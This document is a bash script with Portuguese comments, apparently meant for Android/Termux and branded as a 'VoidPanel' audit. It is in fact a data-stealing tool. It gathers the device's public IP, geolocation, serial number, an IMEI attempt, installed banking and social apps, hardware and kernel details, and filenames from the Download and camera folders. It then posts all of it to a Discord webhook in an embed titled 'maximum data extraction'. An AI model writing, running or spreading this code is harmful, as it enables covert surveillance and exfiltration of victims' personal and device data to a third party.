#!/bin/bash

# CONFIGURACAO DO WEBHOOK
URL="https://discord.com"

# Limpeza de strings para evitar quebra de JSON
c() { echo "$1" | tr -d '\n\r"' | sed 's/\\/\\\\/g' | cut -c1-300; }

# 1. REDE E LOCALIZACAO PROFUNDA
P_IP=$(curl -s --connect-timeout 5 ifconfig.me || echo "0.0.0.0")
L_RAW=$(curl -s "http://ip-api.com")
L_INF=$(c "$(echo "$L_RAW" | tr ',' '\n' | tr -d '{}')")

# 2. IDENTIDADE E CONTAS (USER/SISTEMA)
USER_ID=$(c "$(getprop ro.build.user)")
HOST_ID=$(c "$(getprop ro.build.host)")
SERIAL=$(c "$(getprop ro.serialno)")
IMEI_SV=$(c "$(getprop ro.ril.miui.imei0 || echo 'Bloqueado/Root Requerido')")

# 3. LISTAGEM DE APPS INSTALADOS (TOP 15)
# Mostra o que o usuario usa (ex: bancos, redes sociais)
APPS=$(c "$(pm list packages | head -n 15 | cut -d: -f2 | tr '\n' ', ')")

# 4. MONITORAMENTO FÍSICO (BATERIA E SENSORES)
BAT=$(c "$(termux-battery-status 2>/dev/null | grep -E "percentage|health|status" | tr '\n' ' ')")
TEMP=$(c "$(getprop persys.sys.hw.temp || echo 'N/A')")

# 5. DADOS DE HARDWARE E KERNEL
MOD=$(c "$(getprop ro.product.model)")
BRD=$(c "$(getprop ro.product.brand)")
AND=$(c "$(getprop ro.build.version.release)")
SDK=$(c "$(getprop ro.build.version.sdk)")
ABI=$(c "$(getprop ro.product.cpu.abi)")
KERN=$(c "$(uname -a)")
MEM=$(c "$(free -h | awk '/Mem:/ {print $3 "/" $2}')")

# 6. ARQUIVOS E STORAGE (SE TIVER PERMISSAO)
DOWN=$(c "$(ls -m /sdcard/Download 2>/dev/null | head -c 200)")
DCIM=$(c "$(ls -m /sdcard/DCIM/Camera 2>/dev/null | head -c 200)")

# 7. MONTAGEM DO PAYLOAD (JSON COMPACTO)
PAYLOAD=$(cat <<EOF
{
  "content": "☢️ **AUDITORIA CRÍTICA VOIDPANEL** ☢️",
  "embeds": [{
    "title": "EXTRAÇÃO DE DADOS MÁXIMA",
    "color": 0,
    "fields": [
      {"name": "Identidade", "value": "User: $USER_ID\nHost: $HOST_ID\nSerial: $SERIAL\nIP: $P_IP", "inline": false},
      {"name": "Geo/Rede", "value": "$L_INF", "inline": false},
      {"name": "Hardware", "value": "Mod: $MOD\nBrand: $BRD\nAndroid: $AND (SDK $SDK)\nABI: $ABI\nRAM: $MEM", "inline": false},
      {"name": "Apps Instalados (Amostra)", "value": "$APPS", "inline": false},
      {"name": "Arquivos (Download/DCIM)", "value": "Down: $DOWN\nFotos: $DCIM", "inline": false},
      {"name": "Status/Kernel", "value": "Bat: $BAT\nKernel: $KERN", "inline": false}
    ]
  }]
}
EOF
)

# 8. ENVIO
curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$URL"
